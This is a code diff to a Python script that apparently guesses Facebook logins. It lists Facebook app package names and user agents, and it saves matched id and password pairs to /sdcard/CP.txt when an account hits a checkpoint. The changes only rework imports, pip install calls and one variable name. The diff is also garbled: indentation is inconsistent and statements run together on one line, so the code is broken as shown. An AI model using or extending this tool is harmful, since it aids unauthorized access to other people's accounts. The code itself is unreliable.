@@ -1,5 +1,5 @@
 #import os
-import  os,sys,time,json,random,re,string,platform,base64,uuid
+import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
@@ -9,14 +9,14 @@ from time import sleep
 from os import system as s
 from time import sleep as waktu
  try: 
-         import os,requests,json,time,re,random,sys,uuid,string,subprocess 
-         from string import * 
-         from concurrent.futures import ThreadPoolExecutor as tred 
- except ModuleNotFoundError: 
-         os.system(f'pip install requests futures==2 > /dev/null') 
-         os.system('git pull') 
- except:pass 
- fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite') 
+  import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+ except:pass  fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite') 
   
  ugen=[] 
  ugen=[] 
@@ -224,7 +224,7 @@ from time import sleep as waktu
                                   
                                  break 
                           
-                         elif 'checkpoint' in KRRSS: 
+                         elif 'checkpoint' in main: 
                                  if 'y' in krk: 
                                          print(f'\r\r\033[1;91m [CP] '+ids+' | '+pas+'\033[1;97m') 
                                          open(f'/sdcard/CP.txt', 'a').write(ids+'|'+pas+'\n') 
